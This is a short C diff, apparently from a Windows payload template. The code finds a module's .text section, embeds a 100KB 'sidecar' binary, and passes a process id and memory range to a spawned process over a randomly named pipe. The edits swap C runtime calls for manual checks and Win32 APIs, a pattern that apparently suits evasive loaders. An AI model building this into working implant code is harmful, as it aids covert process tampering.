@@ -14,7 +14,7 @@ TextSectionInfo GetTextSectionInfo(HMODULE hModule) {
     IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(ntHeaders);
 
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
-        if (strncmp((char*)section->Name, ".text", 5) == 0) {
+        if (section->Name[0] == '.' && section->Name[1] == 't' && section->Name[2] == 'e' && section->Name[3] == 'x' && section->Name[4] == 't') {
             info.baseAddress = baseAddr + section->VirtualAddress;
             info.size = section->Misc.VirtualSize;
             break;
@@ -8414,7 +8414,7 @@ unsigned int sidecar_bin_len = 100427;
 
     const char* exeName = "{{PROCESS_SPAWN}}";
     size_t bufferSize = 256;
-    char* result = (char*)malloc(bufferSize);
+    char* result = (char*)HeapAlloc(GetProcessHeap(), 0, bufferSize);
     sprintf_s(result, bufferSize, "\"%s\" %lu 0x%p 0x%lx", exeName, pid, textInfo.baseAddress, textInfo.size);
 
     const char* pipeName = "(\\\\.\\pipe\\5c8a150ae68b4cbc8b5eeacb0f89b7aa)";
@@ -8457,7 +8457,7 @@ unsigned int sidecar_bin_len = 100427;
     }
     ConnectNamedPipe(hPipe, NULL);
     DWORD bytesWritten;
-    WriteFile(hPipe, result, (DWORD)strlen(result), &bytesWritten, NULL);
+    WriteFile(hPipe, result, (DWORD)lstrlenA(result), &bytesWritten, NULL);
 
     // Cleanup
     CloseHandle(hThread);
